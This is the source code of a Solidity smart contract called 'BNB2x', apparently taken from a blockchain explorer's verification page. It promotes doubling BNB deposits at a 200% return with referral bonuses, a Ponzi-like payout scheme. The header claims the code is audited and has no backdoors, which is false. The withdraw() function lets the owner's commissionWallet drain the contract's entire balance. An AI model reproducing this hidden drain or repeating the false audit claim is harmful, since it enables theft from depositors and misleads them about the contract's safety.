/**
 *Submitted for verification at Etherscan.io on 2022-07-09
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-13
*/

/*   BNB2x - Yield Farming Smart Contract built on BNB Smart Chain.
 *   The only official platform of original BNB2x team! All other platforms with the same contract code are FAKE!
 *
 *   [OFFICIAL LINKS]
 * 
 *   ┌────────────────────────────────────────────────────────────┐
 *   │   Website: https://bnb2x.org                               │
 *   │                                                            │
 *   │   Twitter: https://twitter.com/BNB2x_org                   │
 *   │   Telegram: https://t.me/bnb2x                             │
 *   │                                                            │
 *   │   E-mail: [email protected]                                  │
 *   └────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Transfer method directly from wallet without website UI
 *
 *      - Deposit - Transfer BNB you want to double to contract address, use msg.data to provide referrer address
 *      - Withdraw earnings - Transfer 0 BNB to contract address
 *      - Reinvest earnings - Withdraw and Deposit manually
 *
 *   2) Using website UI
 *
 *      - Connect web3 wallet
 *      - Deposit - Enter BNB amount you want to double, click "Double Your BNB" button and confirm transaction
 *      - Reinvest earnings - Click "Double Earnings" button and confirm transaction
 *      - Withdraw earnings - Click "Withdraw Earnings" button and confirm transaction
 *
 *   [DEPOSIT CONDITIONS]
 *
 *   - Minimal deposit: 0.02 BNB, no max limit
 *   - Total income: 200% per deposit
 *   - Earnings every moment, withdraw any time
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - Referral reward: 10%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 90% Platform main balance, using for participants payouts, affiliate program bonuses
 *   - 10% Advertising and promotion expenses, Support work, Development, Administration fee
 *
 *   Verified contract source code has been audited by an independent company
 *   there is no backdoors or unfair rules.
 *
 *   Note: This project has high risks as well as high profits.
 *   Once contract balance drops to zero payments will stops,
 *   deposit at your own risk.
 */
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

contract BNB2x_org {
	uint256 constant INVEST_MIN_AMOUNT = 2e16; // 0.02 bnb
	uint256 constant REFERRAL_PERCENT = 10;
	uint256 constant PROJECT_FEE = 10;
	uint256 constant ROI = 200;
	uint256 constant PERCENTS_DIVIDER = 100;
	uint256 constant PERIOD = 30 days;

	uint256 totalInvested;
	uint256 totalRefBonus;

	struct Deposit {
		uint256 amount;
		uint256 start;
		uint256 withdrawn;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256 referals;
		uint256 totalBonus;
	}

	mapping (address => User) internal users;

	bool started;
	address payable commissionWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Reinvest(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable wallet)  {
		require(!isContract(wallet));
		commissionWallet = wallet;
	}

	fallback() external payable {
		if (msg.value >= INVEST_MIN_AMOUNT) {
			invest(bytesToAddress(msg.data));
		} else {
			withdraw();
		}
	}

    receive() external payable {
		if (msg.value >= INVEST_MIN_AMOUNT) {
			invest(address(0));
		} else {
			withdraw();
		}
	}

	function invest(address referrer) public payable {
		
		checkIn(msg.value, referrer);
	}

	function reinvest() public {
		uint256 totalAmount = checkOut();

		emit Reinvest(msg.sender, totalAmount);

		checkIn(totalAmount, address(0));
	}

	function withdraw() public {
		uint256 totalAmount = checkOut();
        

		if (msg.sender != commissionWallet) {
			payable(msg.sender).transfer(totalAmount);
            emit Withdrawn(msg.sender, totalAmount);

		} else {
			uint256 contractBalance = address(this).balance;
			totalAmount =  contractBalance;
			payable(msg.sender).transfer(totalAmount);
            emit Withdrawn(msg.sender, totalAmount);
			
		}
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalRefBonus);
	}

	function getUserInfo(address userAddress) public view returns(uint256 readyToWithdraw, uint256 totalDeposits, uint256 totalActiveDeposits, uint256 totalWithdrawn, uint256 totalBonus, address referrer, uint256 referals) {
		User storage user = users[userAddress];

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start + PERIOD;
			uint256 roi = user.deposits[i].amount * ROI / PERCENTS_DIVIDER;
			if (user.deposits[i].withdrawn < roi) {
				uint256 profit;
				if (block.timestamp >= finish) {
					profit = roi - user.deposits[i].withdrawn;
				} else {
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = block.timestamp;
					profit = roi * (to - from) / PERIOD;

					totalActiveDeposits += user.deposits[i].amount;
				}

				readyToWithdraw += profit;
			}

			totalDeposits += user.deposits[i].amount;
			totalWithdrawn += user.deposits[i].withdrawn;
		}

		totalBonus = user.totalBonus;
		referrer = user.referrer;
		referals = user.referals;
	}

	function checkIn(uint256 value, address referrer) internal {
		require(value >= INVEST_MIN_AMOUNT, "Less than minimum for deposit");

		uint256 fee = value * PROJECT_FEE / PERCENTS_DIVIDER;
		commissionWallet.transfer(fee);
		emit FeePayed(msg.sender, fee);

		User storage user = users[msg.sender];

		if (user.referrer == address(0) && referrer != msg.sender) {
			user.referrer = referrer;

			address upline = user.referrer;
			users[upline].referals++;
		}

		if (user.referrer != address(0)) {
			uint256 amount = value * REFERRAL_PERCENT / PERCENTS_DIVIDER;
			users[user.referrer].totalBonus += amount;
			totalRefBonus += amount;
			payable(user.referrer).transfer(amount);
			emit RefBonus(user.referrer, msg.sender, amount);
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(value, block.timestamp, 0));

		totalInvested += value;

		emit NewDeposit(msg.sender, value);
	}

	function checkOut() internal returns(uint256) {
		User storage user = users[msg.sender];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start + PERIOD;
			uint256 roi = user.deposits[i].amount * ROI / PERCENTS_DIVIDER;
			if (user.deposits[i].withdrawn < roi) {
				uint256 profit;
				if (block.timestamp >= finish) {
					profit = roi - user.deposits[i].withdrawn;
				} else {
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = block.timestamp;
					profit = roi * (to - from) / PERIOD;
				}

				totalAmount += profit;
				user.deposits[i].withdrawn += profit;
			}
		}

		require(totalAmount > 0, "User has no dividends");

		user.checkpoint = block.timestamp;

		return totalAmount;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	function bytesToAddress(bytes memory _source) internal pure returns(address parsedreferrer) {
		assembly {
			parsedreferrer := mload(add(_source,0x14))
		}
		return parsedreferrer;
	}
	
}